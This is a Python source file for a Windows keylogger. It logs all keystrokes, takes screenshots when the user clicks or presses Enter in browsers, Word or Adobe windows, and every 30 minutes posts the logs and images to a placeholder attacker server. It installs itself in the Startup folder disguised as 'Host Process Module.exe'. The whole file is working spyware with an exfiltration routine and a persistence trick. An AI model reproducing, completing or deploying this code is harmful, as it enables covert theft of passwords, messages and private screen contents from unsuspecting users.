from pynput import mouse,keyboard
from win32api import GetSystemMetrics
from win32gui import GetWindowText,GetForegroundWindow,GetWindowRect,GetCursorPos
import sys,requests,threading,os,inspect,getpass,datetime,time,glob,platform,subprocess
from mss import mss
browsers=('Mozilla Firefox','Google Chrome','Opera','Microsoft Edge','Word','Adobe')
finalDes="C:\\Users\\"+str(getpass.getuser())+"\\AppData\\Roaming\\Microsoft\\Windows\\"
f=open(finalDes+'logs.txt','w')

def set_interval(func, sec):
    global f
    def func_wrapper():
        set_interval(func, sec)
        func()
    t = threading.Timer(sec, func_wrapper)
    t.start()
    return t

def upload():
    global f,finalDes
    f.close()
    url = "your server name/getlog.php"
    if os.stat(finalDes+"logs.txt").st_size==0:
        f=open(finalDes+'logs.txt','a')
        uploadPics()
        return
    f = open(finalDes+"logs.txt","rb")
    try:
        user=platform.node()+'__'+getpass.getuser()
        payload={'id':user}
        r = requests.post(url,data=payload,files={'userfile':f})
        f=open(finalDes+'logs.txt','w')
    except:
        f=open(finalDes+'logs.txt','a')
    uploadPics()


set_interval(upload,1800)

def snap():
    global finalDes
    now = datetime.datetime.now()
    des=finalDes+"pics"
    directory,pic=des,now.strftime("%Y-%m-%d %H_%M_%S")
    if not os.path.exists(directory):
        os.makedirs(directory)
    pic=pic+'.png'
    try:
        with mss() as sct:
            sct.shot()
        os.rename("monitor-1.png",directory+'\\'+pic)
    except:
        pass
    
    
    

def get_key_name(key):
    global f
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        if key==key.enter:
            if inContext():
                time.sleep(3)
                snap()
            return ' <enter>\n'
        if key ==key.space:
            return ' '   
        if key==key.backspace:
            return ' <bs> ' 
        if key==key.shift:
            return ' <shift> '
        if key==key.ctrl_l:
            return ' <ctrl> ' 
        if key==key.delete:
            return ' <del> ' 
        return str(key)

def inContext():
    currentB=GetWindowText(GetForegroundWindow())
    for x in browsers:
        if x in currentB:
            return True
    return False
    
def withIn():
    sw,sh=GetSystemMetrics(0),GetSystemMetrics(1)
    if sw > 2000:
        offset=200
    if sw > 1400:
        offset=150
    if sw <1400:
        offset=50
    hoffset=offset/2
    rect=GetWindowRect(GetForegroundWindow())
    x = rect[0]
    y = rect[1]
    w = rect[2] - x
    h = rect[3] - y
    posx,posy=GetCursorPos()
    return posx>x and posx<((w+x)-offset) and posy>y and posy<((h+y)-(offset-hoffset))

def on_press(key):
    global f
    try:
        f.write(get_key_name(key))
    except:
        pass
    


def uploadPics():
    global finalDes
    url = "your server name/getpic.php"
    now=int(time.time())
    user=platform.node()+'__'+getpass.getuser()
    payload={'id':user,'user':user}
    f =glob.glob(finalDes+'pics/*.png')
    for x in f:
        try:
            file=open(x,"rb")
            r = requests.post(url,data=payload,files={'pic':file})
            file.close()
            os.remove(x)
        except :
            pass


def on_click(x, y, button, pressed):
    global f
    if not pressed:
        f.write('\n')
        if inContext():
            if withIn():
                r = threading.Timer(3.0, snap)
                r.start()
            

            

def startListen():
    if 'startup' not in os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe()))).lower():
        des="C:\\Users\\"+str(getpass.getuser())+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Host Process Module.exe"
        try:
            os.rename("Host Process Module.exe", des)
            subprocess.call(des,shell=True)
            
        except:
            pass
    listen()

def listen():
    with mouse.Listener(on_click=on_click) as listener:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

startListen()
